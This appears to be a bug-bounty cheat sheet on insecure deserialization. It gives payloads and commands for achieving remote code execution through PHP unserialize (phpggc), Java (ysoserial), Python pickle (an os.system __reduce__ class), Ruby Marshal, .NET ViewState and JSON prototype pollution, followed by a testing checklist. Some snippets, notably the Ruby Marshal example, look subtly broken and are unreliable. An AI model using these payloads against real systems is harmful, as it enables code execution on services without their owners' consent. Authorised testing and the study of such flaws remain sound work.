---
name: "h1-deserialization-techniques"
description: "Insecure Deserialization patterns from HackerOne — PHP unserialize RCE, Java deserialization of untrusted data, Python pickle exploitation, Ruby Marshal.load, and .NET ViewState deserialization"
category: web-security
tags: ["deserialization", "rce", "php-unserialize", "java-deserialization", "pickle", "hackerone"]
relevance: 9
---

# H1 Insecure Deserialization Techniques

Real-world Deserialization exploits from HackerOne:

## 1. PHP Unserialize RCE
Report: Mail.ru PHP injection through unserialize → RCE ($3000)
Look for: `unserialize($_GET['data'])`, `unserialize($_POST['data'])`
Detection payload: `O:8:"stdClass":0:{}`
RCE via PHPGGC: `phpggc Monolog/RCE1 system id`

## 2. Java Deserialization
Look for: `java.io.Serializable`, `readObject()`, `ObjectInputStream`
Detection:
- Request with `Accept: application/x-java-serialized-object`
- Binary data starting with `aced0005` (Java serialization magic bytes)
Tools: `ysoserial` - `java -jar ysoserial.jar CommonsCollections1 'id' | base64`

## 3. Python Pickle
Look for: Python apps, ML models, session tokens
Detection: `gAN9cQBMKGNvbW1hbmQKcQFYCgBpZCA+IC90bXAvcDEyM3EKUnEDLg==` (base64 pickle)
```python
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(RCE())
```

## 4. Ruby Marshal.load
Look for: Ruby/Rails apps
```ruby
class RCE
  def self.to_s
    system("id")
  end
end
Marshal.dump(RCE.new)
```

## 5. .NET ViewState Deserialization
Look for: `__VIEWSTATE` parameter in ASP.NET apps
- If `EnableViewStateMac=False` or machineKey is known → deserialization possible
- Tool: `ysoserial.net`

## 6. Node.js/JSON Deserialization
Look for: `JSON.parse(JSON.stringify())` with `__proto__`
- `{"__proto__": {"admin": true}}`
- `{"constructor": {"prototype": {"polluted": true}}}`

## Detection Checklist:
- [ ] Look for base64/hex encoded serialized objects in cookies, form fields, API params
- [ ] Look for binary data starting with magic bytes
- [ ] Test with `ysoserial`/`ysoserial.net`/`phpggc`/`pickle`
- [ ] Check for `__proto__` or `constructor.prototype` in JSON bodies
- [ ] Check for `O:` in PHP form data (PHP serialized object)
